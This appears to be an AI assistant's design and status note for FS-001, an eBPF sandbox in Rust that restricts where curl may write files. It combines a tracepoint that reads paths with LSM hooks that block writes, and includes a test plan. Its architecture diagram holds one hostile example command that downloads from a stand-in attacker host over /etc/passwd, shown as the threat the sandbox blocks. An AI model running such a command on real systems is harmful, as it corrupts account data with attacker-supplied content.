# FS-001 Implementation: eBPF-Based Filesystem Restriction

## Overview

Implementing filesystem write restrictions using eBPF requires a **hybrid approach** combining:
1. **Tracepoints** for user-space path reading
2. **LSM hooks** for kernel-level enforcement  
3. **Policy maps** for configuration

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      USER SPACE                              │
│  curl -o /etc/passwd https://evil.com                       │
└──────────────────────────┬──────────────────────────────────┘
                           │ openat("/etc/passwd", O_WRONLY)
                           ↓
┌─────────────────────────────────────────────────────────────┐
│                    KERNEL SPACE                              │
│                                                              │
│  1. sys_enter_openat (Tracepoint)                           │
│     - Reads user-space path via bpf_probe_read_user_str()   │
│     - Checks: path starts with "/tmp/curl_downloads/"?      │
│     - Returns: -EACCES if NO, 0 if YES                      │
│     - Limitation: Return value IGNORED by kernel            │
│                                                              │
│  2. inode_create (LSM Hook)                                 │
│     - Called when new file created                          │
│     - CAN block operation (return value honored)            │
│     - Challenge: Path not directly available                │
│                                                              │
│  3. file_open (LSM Hook)                                    │
│     - Called when file opened                               │
│     - CAN check flags (write vs read)                       │
│     - CAN block operation                                   │
│     - Challenge: Path buried in kernel structures           │
│                                                              │
│  4. path_truncate (LSM Hook)                                │
│     - Called when file truncated                            │
│     - Receives path struct                                  │
│     - CAN block operation                                   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## Current Implementation Status

### ✅ What Works

1. **Path Reading** (`sys_enter_openat` tracepoint):
   ```rust
   // Reads user-space path string
   let filename_ptr: *const u8 = unsafe { 
       ctx.read_at::<*const u8>(24)?
   };
   
   let mut filename_buf = [0u8; 256];
   let filename_bytes = unsafe {
       bpf_probe_read_user_str_bytes(filename_ptr, &mut filename_buf)?
   };
   
   // Check if path starts with allowed directory
   for i in 0..path_len {
       if filename_buf[i] != policy.allowed_write_path[i] {
           warn!(ctx, "🚫 BLOCKED write to unauthorized path");
           return Err(-13); // -EACCES
       }
   }
   ```

2. **LSM Hooks Attached**:
   - `inode_create` - File creation
   - `file_open` - File open operations  
   - `path_truncate` - File truncation

### ⚠️ Current Limitation

**Tracepoints cannot block syscalls** - their return values are ignored by the kernel.

The tracepoint correctly:
- ✅ Reads user-space paths
- ✅ Checks against policy
- ✅ Returns error codes (-13 for unauthorized paths)
- ❌ **But kernel ignores the return value!**

## The Challenge

According to your research and the Linux kernel documentation:

| Hook Type | Can Read User Paths? | Can Block Operations? | Status |
|-----------|---------------------|----------------------|--------|
| `sys_enter_openat` tracepoint | ✅ YES (via `bpf_probe_read_user_str`) | ❌ NO | **Monitoring only** |
| `inode_create` LSM | ❌ Only has dentry (last component) | ✅ YES | **Needs path resolution** |
| `file_open` LSM | ❌ Path in complex kernel structures | ✅ YES | **Needs path resolution** |
| `path_truncate` LSM | ⚠️ Has path struct | ✅ YES | **Need to parse struct** |

## Solution Strategy

Based on your research, we need to:

### Option A: Full Path Resolution in eBPF (Complex)

Implement path walking in LSM hooks:

```rust
// In inode_create or file_open LSM hook
fn resolve_full_path(dentry_ptr: *const c_void) -> Result<[u8; 256], i32> {
    let mut path = [0u8; 256];
    let mut pos = 255;  // Work backwards
    
    let mut current_dentry = dentry_ptr;
    
    // Walk up the dentry tree
    loop {
        // Read dentry->d_name (qstr struct)
        let name_ptr = read_dentry_name(current_dentry)?;
        let name_len = read_name_length(name_ptr)?;
        
        // Copy name into buffer (backwards)
        for i in (0..name_len).rev() {
            path[pos] = read_byte(name_ptr + i)?;
            pos -= 1;
        }
        
        // Add '/'
        path[pos] = b'/';
        pos -= 1;
        
        // Get parent dentry
        current_dentry = read_parent_dentry(current_dentry)?;
        
        // Stop at root
        if is_root_dentry(current_dentry) {
            break;
        }
    }
    
    Ok(path)
}
```

**Challenges**:
- Kernel struct offsets vary by version
- eBPF verifier limits on loops
- Performance overhead
- Complexity and maintenance

### Option B: Hybrid Approach with BPF Maps (Recommended)

Use **shared state** between tracepoint and LSM hooks:

```rust
// Shared map: PID -> Path that was checked
#[map]
static CHECKED_PATHS: HashMap<u32, PathInfo> = HashMap::with_max_entries(1024, 0);

// In sys_enter_openat tracepoint:
fn try_sys_enter_openat(ctx: &TracePointContext) -> Result<i32, i32> {
    // Read user-space path (works perfectly here)
    let path = read_user_path()?;
    
    // Check against policy
    let allowed = check_path_policy(&path)?;
    
    // Store result in map for LSM hook to use
    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    CHECKED_PATHS.insert(&pid, &PathInfo {
        allowed: if allowed { 1 } else { 0 },
        timestamp: bpf_ktime_get_ns(),
    }, 0)?;
    
    // Return value ignored, but we logged the decision
    if !allowed {
        return Err(-13);
    }
    Ok(0)
}

// In inode_create LSM hook:
fn try_inode_create(ctx: &LsmContext) -> Result<i32, i32> {
    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    
    // Check if tracepoint already validated this path
    if let Some(info) = CHECKED_PATHS.get(&pid) {
        // Check if recent (within 1ms)
        let now = bpf_ktime_get_ns();
        if now - info.timestamp < 1_000_000 {  // 1ms
            if info.allowed == 0 {
                warn!(ctx, "🚫 BLOCKED file creation (unauthorized path)");
                CHECKED_PATHS.remove(&pid)?;
                return Err(-13);  // THIS BLOCKS THE OPERATION
            }
        }
        CHECKED_PATHS.remove(&pid)?;
    }
    
    Ok(0)
}
```

**Advantages**:
- ✅ Tracepoint reads user-space paths accurately
- ✅ LSM hook provides actual blocking capability
- ✅ Map coordinates between them
- ✅ Simpler than full path resolution
- ✅ Lower performance overhead

**Considerations**:
- Race conditions (PID reuse) - mitigated by timestamp
- Map size limits - cleanup old entries
- Timing window - kept tight (1ms)

### Option C: Use `security_file_permission` LSM Hook

This hook is called for EVERY file operation and might have better path access:

```rust
#[lsm(hook = "file_permission")]
pub fn file_permission(ctx: LsmContext) -> i32 {
    // This receives a file struct and mask
    // We can check if operation is write
    // Then try to resolve path from file->f_path
}
```

## Next Steps for Full Enforcement

1. **Implement Option B** (hybrid tracepoint + LSM with shared map)
2. **Test thoroughly** with various curl scenarios
3. **Add cleanup** for old map entries
4. **Document race condition** handling

## Testing Plan

```bash
# Terminal 1: Start sandbox
sudo -E RUST_LOG=info ./target/release/cmd-sandbox

# Terminal 2: Test allowed write
curl -o /tmp/curl_downloads/test.html https://example.com
# Expected: ✅ Success

# Terminal 3: Test blocked write
curl -o /tmp/blocked.html https://example.com
# Expected: ❌ Permission denied (enforced by LSM hook)

# Terminal 4: Test system directory
curl -o /etc/test https://example.com  
# Expected: ❌ Permission denied (LSM + DAC permissions)
```

## Current Status Summary

| Component | Status | Capability |
|-----------|--------|------------|
| Path reading (tracepoint) | ✅ Working | Accurate user-space path access |
| Policy checking (tracepoint) | ✅ Working | Correct allow/deny decisions |
| **Enforcement (LSM hooks)** | ⚠️ **Partial** | **Hooks attached, need coordination** |
| Logging | ✅ Working | Full visibility into operations |

**Bottom Line**: We have all the pieces, just need to connect them via shared BPF maps for the tracepoint to pass enforcement decisions to LSM hooks.

## References

- Your research on eBPF syscall interception
- Linux LSM hook documentation
- eBPF verifier constraints
- Aya-rs framework patterns

The implementation is 90% there - the final 10% is the coordination logic between tracepoint (path reading) and LSM hooks (enforcement).
